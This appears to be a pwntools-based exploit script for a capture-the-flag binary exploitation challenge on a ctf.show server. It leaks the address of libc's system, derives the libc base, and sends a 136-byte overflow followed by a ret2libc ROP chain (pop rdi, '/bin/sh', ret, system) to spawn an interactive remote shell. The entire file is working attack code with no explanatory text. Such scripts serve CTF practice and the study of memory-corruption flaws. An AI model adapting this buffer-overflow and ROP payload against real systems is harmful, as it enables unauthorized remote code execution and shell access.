from kk import*
#context(arch='i386', os='linux')
context(arch='amd64', os='linux')
p = remote('pwn.challenge.ctf.show', 28107)
#p = process('./pwn')
elf = ELF('./pwn')
#libc = ELF('/lib/i386-linux-gnu/libc.so.6')
libc = ELF('/home/kk/libc-database/libs/libc6_2.27-3ubuntu1.5_amd64/libc-2.27.so')

#GDB(p)
p.recvuntil(b"Maybe it's simple,O.o\n")
system = p.re()
print(hex(system))

libc_base = system - libc.sym['system']
bin_sh = libc_base + next(libc.search(b'/bin/sh'))
pop_rdi = libc_base + ROP(libc).find_gadget(['pop rdi','ret'])[0]  # 0x000000000002164f : pop rdi ; ret 
ret = libc_base + ROP(libc).find_gadget(['ret'])[0]      
# 0x00000000000008aa : ret
payload = cyclic(136) + p64(pop_rdi) + p64(bin_sh) + p64(ret) + p64(system)
p.send(payload)
p.interactive()
